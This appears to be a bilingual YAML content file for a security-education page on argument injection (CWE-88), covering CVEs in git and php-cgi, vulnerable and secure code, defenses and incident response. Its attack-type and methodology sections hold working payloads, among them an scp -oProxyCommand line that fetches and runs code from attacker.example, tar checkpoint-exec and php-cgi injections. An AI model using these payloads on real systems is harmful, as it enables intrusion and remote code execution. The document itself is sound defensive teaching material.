@@ -1,0 +1,376 @@
+meta:
+  id: argumentinjection
+  threatId: cat_1_research08
+  severity: Critical
+  color: '#0891b2'
+  colorRgb: 8,145,178
+  cwe: CWE-88
+  cvss: '9.8'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'Argument '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: Argument Injection
+  lead:
+    en: The defense everyone reaches for first -- pass arguments as an array, never a shell string -- fully stops command injection and does nothing at all against this class. When a program is invoked via execve()/ProcessBuilder with argv, attacker-controlled data still reaches the target program's own option parser, which happily treats a value starting with - as a flag rather than data. git's --upload-pack=, tar's --checkpoint-action=exec=, and ssh's -oProxyCommand= turn a filename or URL field into remote code execution, with zero shell metacharacters involved.
+    pl: Obrona po którą wszyscy sięgają najpierw -- przekazuj argumenty jako tablicę, nigdy jako string powłoki -- w pełni zatrzymuje wstrzyknięcie polecenia i nic nie robi przeciw tej klasie. Gdy program jest wywoływany przez execve()/ProcessBuilder z argv, dane kontrolowane przez atakującego wciąż trafiają do własnego parsera opcji programu docelowego, który chętnie potraktuje wartość zaczynającą się od - jako flagę zamiast danych. --upload-pack= gita, --checkpoint-action=exec= tara i -oProxyCommand= ssh zamieniają pole nazwy pliku lub URL w zdalne wykonanie kodu, bez ani jednego metaznaku powłoki.
+  metrics:
+  - k: CWE-88
+    v:
+      en: Weakness ID
+      pl: ID słabości
+  - k: '9.8'
+    v: CVSS · Critical (CVE-2024-4577)
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A03:2021
+    url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  - label: CWE-88 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/88.html
+  - label: Snyk — Argument injection in git and mercurial
+    url: https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
+  - label: GTFOArgs
+    url: https://gtfoargs.github.io/
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Six variants, from a core-git protocol flaw to wrapper-library issues to generic CLI utilities. None require a shell -- every payload here works identically against an execve()/ProcessBuilder argv array.
+      pl: Sześć wariantów, od wady w samym protokole gita przez problemy bibliotek-wrapperów po ogólne narzędzia CLI. Żaden nie wymaga powłoki -- każdy ładunek tutaj działa identycznie przeciw tablicy argv execve()/ProcessBuilder.
+    items:
+    - name: 'Git core: ssh:// submodule ProxyCommand injection (CVE-2017-1000117)'
+      sev: critical
+      description:
+        en: A repository's .gitmodules declares a submodule URL like ssh://-oProxyCommand=cmd/foo. Running git clone --recursive against it makes git invoke ssh with the hostname parsed as the -oProxyCommand option, executing the attacker's command locally before any network connection happens. Fixed in git 2.7.6+ (and parallel patches to Mercurial/Subversion for the same class of bug).
+        pl: Repozytorium deklaruje w .gitmodules URL submodułu jak ssh://-oProxyCommand=cmd/foo. Uruchomienie git clone --recursive na nim powoduje że git wywołuje ssh z nazwą hosta sparsowaną jako opcja -oProxyCommand, wykonując polecenie atakującego lokalnie zanim nastąpi jakiekolwiek połączenie sieciowe. Naprawione w git 2.7.6+ (i równoległych łatkach do Mercurial/Subversion dla tej samej klasy błędu).
+      payload: ssh://-oProxyCommand=touch${IFS}/tmp/pwned/foo  (as a submodule URL in .gitmodules)
+    - name: Git/Mercurial wrapper-library --upload-pack / --config injection
+      sev: critical
+      description:
+        en: 'A whole family of 2022 CVEs across git/Mercurial wrapper libraries (npm git-clone, simple-git, ruby-git, ungit, Bundler, Weblate, GoCD): an attacker-controlled URL or branch string beginning with --upload-pack= (git) or --config=alias.x=!cmd (Mercurial) runs an arbitrary program when the library shells out without a -- separator.'
+        pl: 'Cała rodzina CVE z 2022 w bibliotekach-wrapperach git/Mercurial (npm git-clone, simple-git, ruby-git, ungit, Bundler, Weblate, GoCD): kontrolowany przez atakującego string URL lub gałęzi zaczynający się od --upload-pack= (git) albo --config=alias.x=!cmd (Mercurial) uruchamia dowolny program gdy biblioteka wywołuje polecenie bez separatora --.'
+      payload: --upload-pack=touch /tmp/pwned  (as a git remote URL/branch)   |   --config=alias.clone=!touch HELLO  (as a Mercurial value)
+    - name: PHP php-cgi query-string argument injection (CVE-2012-1823 / CVE-2024-4577)
+      sev: critical
+      description:
+        en: 'A query string with no = sign is passed by the web server straight to the php-cgi binary as command-line arguments (CVE-2012-1823, 2012), letting an attacker inject -d to set arbitrary php.ini directives -> RCE. Reopened in 2024 (CVE-2024-4577, CVSS 9.8, CISA KEV-listed): Windows'' Best-Fit codepage mapping silently converts a Unicode soft hyphen to an ASCII hyphen after PHP''s own escaping runs, resurrecting the exact same injection on default XAMPP-on-Windows installs.'
+        pl: 'Query string bez znaku = jest przekazywany przez serwer webowy wprost do binarki php-cgi jako argumenty wiersza poleceń (CVE-2012-1823, 2012), pozwalając atakującemu wstrzyknąć -d by ustawić dowolne dyrektywy php.ini -> RCE. Otwarte ponownie w 2024 (CVE-2024-4577, CVSS 9.8, wpisane do CISA KEV): mapowanie Best-Fit stron kodowych Windows po cichu konwertuje unikodowy miękki łącznik na ASCII myślnik po tym jak zadziała własne escapowanie PHP, wskrzeszając dokładnie to samo wstrzyknięcie na domyślnych instalacjach XAMPP-na-Windows.'
+      payload: ?-d+allow_url_include=1+-d+auto_prepend_file=php://input  (POST body carries the PHP payload)
+    - name: tar wildcard argument injection (--checkpoint-action=exec=)
+      sev: critical
+      description:
+        en: When a privileged job runs tar czf backup.tgz * in a directory an attacker can write to, the shell's own wildcard expansion turns files literally named --checkpoint=1 and --checkpoint-action=exec=sh evil.sh into tar's argv -- and tar dutifully executes the script as whichever user ran the backup, often root. A real GNU tar feature, not a bug in tar itself.
+        pl: Gdy uprzywilejowane zadanie uruchamia tar czf backup.tgz * w katalogu do którego atakujący może zapisywać, własna ekspansja wildcard powłoki zamienia pliki dosłownie nazwane --checkpoint=1 i --checkpoint-action=exec=sh evil.sh w argv tara -- a tar posłusznie wykonuje skrypt jako ten użytkownik który uruchomił backup, często root. Realna funkcja GNU tar, nie błąd w samym tarze.
+      payload: touch -- "--checkpoint=1" "--checkpoint-action=exec=sh evil.sh"
+    - name: wget / curl argument injection (arbitrary file write)
+      sev: high
+      description:
+        en: 'A URL or filename beginning with - handed to wget or curl is parsed as a flag: --output-document=/path (wget) or -o/-K (curl) redirects output to an attacker-chosen path, overwriting cron files, SSH authorized_keys, or a web-writable directory -- an arbitrary-write primitive that commonly escalates straight to RCE.'
+        pl: 'URL lub nazwa pliku zaczynająca się od - przekazana do wget lub curl jest parsowana jako flaga: --output-document=/path (wget) albo -o/-K (curl) przekierowuje wyjście do wybranej przez atakującego ścieżki, nadpisując pliki cron, SSH authorized_keys, albo katalog zapisywalny przez web -- prymityw dowolnego zapisu który powszechnie eskaluje wprost do RCE.'
+      payload: 'wget "$USER_URL" -P /tmp  # USER_URL = ''--output-document=/home/app/.ssh/authorized_keys'''
+    - name: ssh/scp -oProxyCommand hostname injection
+      sev: critical
+      description:
+        en: 'The same primitive as the git submodule case, applied directly: any application feature that treats a user-supplied string as an ssh/scp/rsync hostname and passes it through unvalidated is vulnerable if that string begins with -oProxyCommand= -- the command runs locally before any connection attempt.'
+        pl: 'Ten sam prymityw co przypadek submodułu git, zastosowany bezpośrednio: każda funkcja aplikacji która traktuje dostarczony przez użytkownika string jako hosta ssh/scp/rsync i przekazuje go bez walidacji jest podatna jeśli ten string zaczyna się od -oProxyCommand= -- polecenie wykonuje się lokalnie zanim nastąpi jakakolwiek próba połączenia.'
+      payload: scp file.txt '-oProxyCommand=sh -c "curl http://attacker.example/x|sh"':/tmp/
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: The fix is never 'use an argv array instead of a shell' -- these examples already do that. The fix is a literal -- separator plus rejecting leading-dash values, or better, a native library binding that has no CLI option parser to confuse at all.
+      pl: Naprawą nigdy nie jest 'użyj tablicy argv zamiast powłoki' -- te przykłady już to robią. Naprawą jest dosłowny separator -- plus odrzucanie wartości zaczynających się od myślnika, albo lepiej, natywne wiązanie biblioteki które w ogóle nie ma parsera opcji CLI do wprowadzenia w błąd.
+    languages:
+    - label: Python
+      lang: python
+      vulnerable: '# VULNERABLE -- no shell, but url can still be a flag
+
+        subprocess.run(["git", "clone", url, dest])
+
+        # url = "--upload-pack=touch /tmp/pwned"  ->  RCE, zero shell metacharacters'
+      safe: "# SECURE -- reject leading dash AND insert \"--\" before positionals\nif url.startswith(\"-\"):\n    raise ValueError(\"refusing option-like URL\")\nsubprocess.run([\"git\", \"clone\", \"--\", url, dest])\n# Best: use pygit2/libgit2 instead of shelling out to the git CLI at all"
+    - label: Node.js
+      lang: javascript
+      vulnerable: '// VULNERABLE -- execFile avoids the shell, but the arg can still be a flag
+
+        execFile("wget", [userUrl, "-P", downloadDir], cb);
+
+        // userUrl = "--output-document=/home/app/.ssh/authorized_keys"'
+      safe: '// SECURE -- validate scheme, reject leading dash, terminate options
+
+        if (!/^https?:\/\//.test(userUrl)) throw new Error("bad url");
+
+        execFile("wget", ["--", userUrl, "-P", downloadDir], cb);'
+    - label: Shell / filename handling
+      lang: bash
+      vulnerable: '# VULNERABLE -- wildcard expansion hands attacker filenames straight to tar as argv
+
+        tar czf backup.tgz *'
+      safe: '# SECURE -- prefix every entry so it can never start with "-", and add "--"
+
+        tar czf backup.tgz -- ./*
+
+        # Best: enumerate an explicit file list rather than relying on shell globbing at all'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: 'The tell that separates this from command injection: classic shell-metacharacter payloads fail cleanly, but the app is visibly shelling out to a known CLI tool.'
+      pl: 'Sygnał odróżniający to od wstrzyknięcia polecenia: klasyczne ładunki metaznaków powłoki zawodzą czysto, ale aplikacja widocznie wywołuje znane narzędzie CLI.'
+    steps:
+    - title:
+        en: Rule out command injection, suspect argument injection
+        pl: Wyklucz wstrzyknięcie polecenia, podejrzewaj wstrzyknięcie argumentu
+      description:
+        en: If ;id, |id, and `id` are neutralized or reflected literally, but the feature clearly invokes git/tar/ssh/wget/curl under the hood, the app likely uses an argv array with no shell -- pivot to leading-dash payloads instead.
+        pl: Jeśli ;id, |id, i `id` są neutralizowane albo odbite dosłownie, ale funkcja wyraźnie wywołuje pod spodem git/tar/ssh/wget/curl, aplikacja prawdopodobnie używa tablicy argv bez powłoki -- przejdź na ładunki z myślnikiem na początku.
+    - title:
+        en: Fingerprint the exact binary in use
+        pl: Rozpoznaj dokładną używaną binarkę
+      description:
+        en: Error messages, timing, or version banners reveal which CLI tool is invoked, which determines the exact flag catalog available (consult references like GTFOArgs for per-binary primitives).
+        pl: Komunikaty błędów, czas odpowiedzi lub banery wersji ujawniają które narzędzie CLI jest wywoływane, co determinuje dokładny dostępny katalog flag (skonsultuj referencje jak GTFOArgs pod kątem prymitywów per binarka).
+    - title:
+        en: Confirm the parser consumes a leading-dash value
+        pl: Potwierdź że parser konsumuje wartość z myślnikiem na początku
+      description:
+        en: Submit a value starting with - or -- (e.g. --help, --version) and watch for a behavior/error change that indicates the target program's own option parser, not a positional-argument handler, received it.
+        pl: Wyślij wartość zaczynającą się od - albo -- (np. --help, --version) i obserwuj zmianę zachowania/błędu wskazującą że własny parser opcji programu docelowego, nie handler argumentu pozycyjnego, ją otrzymał.
+    - title:
+        en: Choose the weaponized flag for that specific tool
+        pl: Wybierz uzbrojoną flagę dla tego konkretnego narzędzia
+      description:
+        en: git -> --upload-pack=/--config=alias...!cmd; tar -> --checkpoint-action=exec=; ssh/scp -> -oProxyCommand=; wget/curl -> -o/--output-document; php-cgi -> -d auto_prepend_file=php://input.
+        pl: git -> --upload-pack=/--config=alias...!cmd; tar -> --checkpoint-action=exec=; ssh/scp -> -oProxyCommand=; wget/curl -> -o/--output-document; php-cgi -> -d auto_prepend_file=php://input.
+    - title:
+        en: Escalate a file-write primitive to RCE where the flag itself is not exec
+        pl: Eskaluj prymityw zapisu pliku do RCE gdy sama flaga nie jest exec
+      description:
+        en: Turn an arbitrary-write flag (wget -O, curl -o) into code execution by overwriting SSH authorized_keys, a cron file, or a web-writable directory, since not every tool exposes a direct exec= style flag.
+        pl: Zamień flagę dowolnego zapisu (wget -O, curl -o) w wykonanie kodu przez nadpisanie SSH authorized_keys, pliku cron, albo katalogu zapisywalnego przez web, bo nie każde narzędzie udostępnia bezpośrednią flagę w stylu exec=.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: 'The single most important teaching point in this deep-dive: switching from a shell string to an argv array -- the standard command-injection fix -- provides close to zero protection here on its own, because the target program''s own option parser still runs on that clean array.'
+      pl: 'Pojedynczy najważniejszy punkt dydaktyczny tego deep-dive: przejście ze stringa powłoki na tablicę argv -- standardowa naprawa wstrzyknięcia polecenia -- samo w sobie daje tu bliską zeru ochronę, bo własny parser opcji programu docelowego wciąż działa na tej czystej tablicy.'
+    items:
+    - rank: 1
+      eff: 92
+      kind: primary
+      label:
+        en: Insert a literal -- before all user-controlled positional arguments
+        pl: Wstaw dosłowny separator -- przed wszystkimi kontrolowanymi przez użytkownika argumentami pozycyjnymi
+      note:
+        en: 'The fix used by essentially every git-wrapper CVE patch in this deep-dive. Caveat: a minority of tools do not fully honor -- in every option context, so pair with #2.'
+        pl: 'Naprawa użyta w zasadzie w każdej łatce CVE wrapperów gita w tym deep-dive. Zastrzeżenie: mniejszość narzędzi nie w pełni honoruje -- w każdym kontekście opcji, więc połącz z #2.'
+    - rank: 2
+      eff: 88
+      kind: primary
+      label:
+        en: Reject values starting with -, or prefix filenames with ./
+        pl: Odrzucaj wartości zaczynające się od -, albo prefiksuj nazwy plików przez ./
+      note:
+        en: Simple, effective, and works even against tools with inconsistent -- support. Combine with encoding normalization -- CVE-2024-4577 shows a Unicode soft hyphen can slip past naive dash-checking on Windows.
+        pl: Proste, skuteczne, i działa nawet przeciw narzędziom z niespójnym wsparciem --. Połącz z normalizacją kodowania -- CVE-2024-4577 pokazuje że unikodowy miękki łącznik może przemknąć obok naiwnego sprawdzania myślnika na Windows.
+    - rank: 3
+      eff: 95
+      kind: strong
+      label:
+        en: Use a native language binding instead of shelling out
+        pl: Użyj natywnego wiązania językowego zamiast wywoływania z powłoki
+      note:
+        en: libgit2/pygit2, tarfile/zipfile modules, an HTTP client library instead of curl/wget -- eliminates the CLI option parser as an attack surface entirely. Highest assurance, highest refactor cost.
+        pl: libgit2/pygit2, moduły tarfile/zipfile, biblioteka klienta HTTP zamiast curl/wget -- całkowicie eliminuje parser opcji CLI jako powierzchnię ataku. Najwyższa pewność, najwyższy koszt refaktoryzacji.
+    - rank: 4
+      eff: 75
+      kind: strong
+      label:
+        en: Strict allowlist / typed validation of the value grammar
+        pl: Ścisła allowlista / typowana walidacja gramatyki wartości
+      note:
+        en: Effective wherever the value space is constrained (URL must match ^https?://, branch must match a safe charset AND not start with -). Doesn't generalize to free-form filename fields.
+        pl: Skuteczne wszędzie gdzie przestrzeń wartości jest ograniczona (URL musi pasować do ^https?://, gałąź musi pasować do bezpiecznego zestawu znaków I nie zaczynać się od -). Nie generalizuje się do dowolnych pól nazw plików.
+    - rank: 5
+      eff: 5
+      kind: weak
+      label:
+        en: Passing argv as an array / avoiding shell=True, alone
+        pl: Samo przekazywanie argv jako tablicy / unikanie shell=True
+      note:
+        en: Necessary against command injection, but provides almost no protection against argument injection by itself -- the exact false sense of security this deep-dive exists to correct. subprocess.run(['git','clone',url]) is fully immune to '; rm -rf /' yet fully exploitable via url='--upload-pack=...'.
+        pl: Konieczne przeciw wstrzyknięciu polecenia, ale samo w sobie daje niemal zerową ochronę przeciw wstrzyknięciu argumentu -- dokładnie to fałszywe poczucie bezpieczeństwa, które ten deep-dive ma za zadanie skorygować. subprocess.run(['git','clone',url]) jest w pełni odporne na '; rm -rf /' a jednak w pełni eksploatowalne przez url='--upload-pack=...'.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: A core-git protocol flaw, a 12-years-apart CGI resurgence on Windows, and a wildcard-driven privesc technique reproduced in essentially every OSCP-style lab.
+      pl: Wada w samym protokole gita, powracająca po 12 latach na Windows podatność CGI, i technika eskalacji uprawnień oparta na wildcard odtwarzana w zasadzie w każdym laboratorium w stylu OSCP.
+    items:
+    - org: Git (core project)
+      year: 2017
+      impact: CVE-2017-1000117
+      cost: Silent local RCE on git clone --recursive against a malicious repo
+      description:
+        en: A .gitmodules file declaring a submodule URL like ssh://-oProxyCommand=cmd/foo made git invoke ssh with the attacker's command as a ProxyCommand option, executing locally before any network connection. Affected git core itself (versions before 2.7.6, 2.8.6, 2.9.5, 2.10.4, 2.11.3, 2.12.4, 2.13.4, 2.14.1), not a downstream wrapper -- and parallel research found the identical class of bug in Mercurial and Subversion the same year.
+        pl: Plik .gitmodules deklarujący URL submodułu jak ssh://-oProxyCommand=cmd/foo powodował że git wywoływał ssh z poleceniem atakującego jako opcją ProxyCommand, wykonywanym lokalnie zanim nastąpiło jakiekolwiek połączenie sieciowe. Dotyczyło samego rdzenia gita (wersje sprzed 2.7.6, 2.8.6, 2.9.5, 2.10.4, 2.11.3, 2.12.4, 2.13.4, 2.14.1), nie downstreamowego wrappera -- a równoległe badania znalazły identyczną klasę błędu w Mercurial i Subversion tego samego roku.
+    - org: PHP (php-cgi)
+      year: 2024
+      impact: CVE-2024-4577, CVSS 9.8, CISA KEV-listed
+      cost: Unauthenticated RCE on default XAMPP-on-Windows installs
+      description:
+        en: 'A 2024 resurgence of the 2012 CVE-2012-1823 query-string argument-injection bug: Windows'' "Best-Fit" codepage mapping silently converts a Unicode soft hyphen (0xAD) to an ASCII hyphen after PHP''s own 2012-era escaping runs, letting the identical -d php.ini-directive injection through again. Affected PHP 8.3<8.3.8, 8.2<8.2.20, 8.1<8.1.29; a public PoC and active exploitation followed within days.'
+        pl: 'Powrót w 2024 błędu wstrzyknięcia argumentu przez query string z 2012 (CVE-2012-1823): mapowanie stron kodowych Windows "Best-Fit" po cichu konwertuje unikodowy miękki łącznik (0xAD) na ASCII myślnik po tym jak zadziała własne escapowanie PHP z 2012 roku, przepuszczając ponownie identyczne wstrzyknięcie dyrektywy php.ini -d. Dotyczyło PHP 8.3<8.3.8, 8.2<8.2.20, 8.1<8.1.29; publiczny PoC i aktywna eksploatacja nastąpiły w ciągu kilku dni.'
+    - org: GNU tar (technique, not a single CVE)
+      year: 2015
+      impact: '"Unix Wildcards Gone Wild" (DefenseCode research)'
+      cost: Local privilege escalation whenever a privileged job tars a wildcard in an attacker-writable directory
+      description:
+        en: 'Not a bug in tar -- --checkpoint-action=exec= is a documented, intended feature. The vulnerability is entirely in the calling pattern: any script that runs tar ... * (or chown/chmod/rsync with similar wildcard exposure) in a directory attackers can write to is exploitable by simply naming files after the dangerous flags. Reproduced constantly in privilege-escalation training material since this research was published.'
+        pl: 'To nie błąd w tarze -- --checkpoint-action=exec= to udokumentowana, zamierzona funkcja. Podatność leży całkowicie w sposobie wywołania: każdy skrypt który uruchamia tar ... * (albo chown/chmod/rsync z podobną ekspozycją wildcard) w katalogu do którego atakujący mogą zapisywać jest eksploatowalny przez zwykłe nazwanie plików wg niebezpiecznych flag. Powielane stale w materiałach szkoleniowych eskalacji uprawnień odkąd to badanie zostało opublikowane.'
+    inlineSources:
+    - label: CVE-2017-1000117 (Red Hat Bugzilla)
+      url: https://bugzilla.redhat.com/show_bug.cgi?id=1480386
+    - label: GHSA — CVE-2024-4577 (php-src advisory)
+      url: https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+    - label: Unix Wildcards Gone Wild (exploit-db 33930)
+      url: https://www.exploit-db.com/papers/33930
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: 'A known coverage gap: mainstream SAST taint engines model ''tainted data reaches a process-spawn call'' well, but rarely model ''does this specific argv slot get parsed as a flag by this specific binary'' -- so this class is caught mostly by manual review and targeted fuzzing, not automated scanning.'
+      pl: 'Znana luka pokrycia: główne silniki taint SAST dobrze modelują "skażone dane docierają do wywołania spawn procesu", ale rzadko modelują "czy ten konkretny slot argv jest parsowany jako flaga przez tę konkretną binarkę" -- więc ta klasa jest wyłapywana głównie przez ręczny przegląd i celowany fuzzing, nie automatyczne skanowanie.'
+    sast:
+    - - Semgrep
+      - General command-execution taint rules (subprocess/child_process/execFile) flag the sink, but no confirmed dedicated leading-dash/missing-"--" rule exists in the public registry -- treat as a coverage gap, write custom rules per invoked binary
+    - - CodeQL
+      - Command-line-injection taint queries (py/command-line-injection, js/command-line-injection) trace input into process args, overlapping this class without specifically modeling option-parser confusion
+    dast:
+    - - GTFOArgs
+      - Curated per-binary reference of exploitable argument-injection primitives (git, tar, wget, ssh, rsync, sendmail, and more) -- the argument-injection analog of GTFOBins
+    - - Manual fuzzing with leading-dash and Unicode-lookalike payloads
+      - Submit -/--flag-prefixed values (and CVE-2024-4577-style Unicode soft hyphens) to every field that feeds a CLI invocation, watching for parser-level behavior changes
+    note:
+      en: <strong>Key signal:</strong> grep every subprocess/execFile/ProcessBuilder call site for a positional user-controlled value with no preceding "--" and no leading-dash rejection -- a small, greppable pattern compared to most injection classes, since the affected call sites are exactly "shells out to a known CLI tool."
+      pl: <strong>Kluczowy sygnał:</strong> przeszukaj każde miejsce wywołania subprocess/execFile/ProcessBuilder pod kątem kontrolowanej przez użytkownika wartości pozycyjnej bez poprzedzającego "--" i bez odrzucania myślnika na początku -- mały, łatwy do wyszukania wzorzec w porównaniu do większości klas wstrzyknięć, bo dotknięte miejsca wywołania to dokładnie "wywołuje z powłoki znane narzędzie CLI".
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: All three research passes independently confirmed the same CWE parentage, correcting a common assumption that CWE-20 (Improper Input Validation) is CWE-88's formal parent -- it is not.
+      pl: Wszystkie trzy przejścia badawcze niezależnie potwierdziły to samo pochodzenie CWE, korygując częste założenie że CWE-20 (Improper Input Validation) jest formalnym rodzicem CWE-88 -- nie jest.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-88 — Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') -- primary, current CWE entry (formerly titled 'Argument Injection or Modification')
+      - ChildOf CWE-77 (Command Injection) and CWE-74 (Injection) -- CWE-77 is the direct parent, per all three research passes, confirming argument injection as a specialized subset of command injection
+      - CWE-78 (OS Command Injection) is a sibling under CWE-77, not a parent or child of CWE-88 -- the two are commonly chained in practice (argument injection as the entry point, escalating to command execution) but are formally distinct weaknesses
+      - CWE-20 (Improper Input Validation) is a related contributing root cause discussed in CWE-88's own mitigation guidance, but is NOT listed as a formal ChildOf parent -- a common assumption this deep-dive corrects
+    - std: OWASP
+      items:
+      - A03:2021 — Injection (no separate OWASP Top 10 line item exists specifically for argument injection)
+    inlineSources:
+    - label: CWE-88 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/88.html
+    - label: CWE-77 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/77.html
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active argument-injection exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji wstrzyknięcia argumentu, przejdź tę listę od góry.
+    steps:
+    - en: Treat the host as fully compromised if a command-execution flag (git --upload-pack, tar --checkpoint-action=exec, ssh -oProxyCommand) was confirmed -- rotate all reachable credentials/secrets
+      pl: Traktuj hosta jako w pełni skompromitowanego jeśli potwierdzono flagę wykonania polecenia (git --upload-pack, tar --checkpoint-action=exec, ssh -oProxyCommand) -- zrotuj wszystkie osiągalne poświadczenia/sekrety
+    - en: Identify the exact CLI binary and invocation pattern exploited, and check whether a "--" separator is present at that call site
+      pl: Zidentyfikuj dokładną wykorzystaną binarkę CLI i wzorzec wywołania, sprawdź czy w tym miejscu wywołania jest obecny separator "--"
+    - en: Grep the codebase for every other invocation of the same binary (git/tar/ssh/wget/curl) with user-controlled positional arguments, not just the one exploited
+      pl: Przeszukaj kod pod kątem każdego innego wywołania tej samej binarki (git/tar/ssh/wget/curl) z kontrolowanymi przez użytkownika argumentami pozycyjnymi, nie tylko tego które zostało wykorzystane
+    - en: If exploitation used a wildcard-driven privesc pattern (tar/chown/chmod on *), audit every privileged cron/scheduled job for the same attacker-writable-directory-plus-wildcard pattern
+      pl: Jeśli eksploatacja użyła wzorca eskalacji uprawnień opartego na wildcard (tar/chown/chmod na *), przeaudytuj każde uprzywilejowane zadanie cron/zaplanowane pod kątem tego samego wzorca katalog-zapisywalny-przez-atakującego-plus-wildcard
+    - en: Patch the call site with a literal "--" separator and leading-dash rejection, and check for CVE-2024-4577-style Unicode-lookalike bypasses if the affected system is Windows
+      pl: Załataj miejsce wywołania dosłownym separatorem "--" i odrzucaniem myślnika na początku, sprawdź obejścia w stylu CVE-2024-4577 przez unikodowe podobieństwa jeśli dotknięty system to Windows
+    - en: Notify per applicable data-breach obligations if data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli dane zostały eksfiltrowane
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: CWE-88 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/88.html
+    - label: CWE-77 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/77.html
+    - label: Snyk — Argument injection in git and mercurial
+      url: https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
+    - label: CVE-2017-1000117 (Red Hat Bugzilla)
+      url: https://bugzilla.redhat.com/show_bug.cgi?id=1480386
+    - label: GHSA — CVE-2024-4577 (php-src advisory)
+      url: https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+    - label: Unix Wildcards Gone Wild (exploit-db 33930)
+      url: https://www.exploit-db.com/papers/33930
+    - label: GTFOArgs
+      url: https://gtfoargs.github.io/
